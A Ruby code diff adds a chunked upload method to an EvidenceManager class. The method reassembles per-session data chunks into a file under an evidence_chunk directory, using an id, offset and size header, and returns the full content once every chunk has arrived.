@@ -21,6 +21,7 @@ class EvidenceManager
   include RCS::Tracer
 
   REPO_DIR = Dir.pwd + '/evidence'
+  REPO_CHUNK_DIR = Dir.pwd + '/evidence_chunk'
 
   SYNC_IDLE = 0
   SYNC_IN_PROGRESS = 1
@@ -141,7 +142,61 @@ class EvidenceManager
       raise "Cannot save evidence"
     end
   end
-  
+
+  def store_evidence_chunk(session, id, base, chunk, size, content)
+    Dir::mkdir(REPO_CHUNK_DIR) if not File.directory?(REPO_CHUNK_DIR)
+    path =  REPO_CHUNK_DIR + '/' + session[:ident] + '_' + session[:instance]
+
+    header_len = 12
+    header = []
+
+    # if the file already exist, take the data from it
+    # otherwise initialize it with the current data
+    if File.exist?(path)
+      File.open(path, 'rb+') {|f| header = f.read(header_len).unpack('I*') }
+    else
+      File.open(path, 'wb+') do |f|
+        header = [id, base, size]
+        f.write(header.pack('I*'))
+      end
+    end
+
+    # consistency check on id
+    if id != header[0]
+      File.delete(path)
+      return 0, nil
+    end
+
+    # consistency on the base address to start writing
+    # if not equal, send back the latest we have written
+    return header[1] if header[1] != base
+
+    # go to the base for writing and append the chunk
+    File.open(path, 'rb+') do |f|
+      f.seek(header_len + header[1], IO::SEEK_SET)
+      f.write(content)
+
+      header[1] += chunk
+
+      # go back to the header
+      f.seek(0, IO::SEEK_SET)
+      f.write(header.pack('I*'))
+    end
+
+    # not finished yet
+    return header[1], nil if header[1] != size
+
+    # the file is complete, read the content and return it
+    complete = File.open(path, 'rb+') do |f|
+      f.seek(header_len, IO::SEEK_SET)
+      f.read
+    end
+
+    File.delete(path)
+
+    return size, complete
+  end
+
   def get_evidence(id, instance)
     # sanity check
     path = REPO_DIR + '/' + instance
